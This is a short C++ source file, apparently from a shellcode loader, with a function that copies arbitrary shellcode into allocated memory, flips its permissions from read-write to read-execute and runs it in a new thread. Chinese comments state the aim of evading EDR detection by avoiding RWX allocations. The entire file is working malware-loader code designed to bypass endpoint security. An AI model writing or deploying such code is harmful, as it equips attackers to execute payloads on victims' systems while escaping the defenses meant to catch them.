#include "memory_loader.h"
#include <iostream>

bool ExecuteShellcode(unsigned char* shellcode, size_t size) {
    // 1. 申请 RW (可读可写) 内存，EDR 对 RWX 非常敏感，对 RW 容忍度高
    LPVOID pMemory = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pMemory == NULL) {
        std::cerr << "[-] VirtualAlloc 申请 RW 内存失败" << std::endl;
        return false;
    }

    // 2. 把 Shellcode 拷贝进去
    memcpy(pMemory, shellcode, size);

    // 3. 把内存权限改为 RX (可读可执行)，隐藏写权限
    DWORD oldProtect;
    if (!VirtualProtect(pMemory, size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] VirtualProtect 修改为 RX 失败" << std::endl;
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return false;
    }

    // 4. 创建线程执行
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "[-] CreateThread 失败" << std::endl;
        VirtualFree(pMemory, 0, MEM_RELEASE);
        return false;
    }

    // 5. 等待并清理
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(pMemory, 0, MEM_RELEASE);
    return true;
}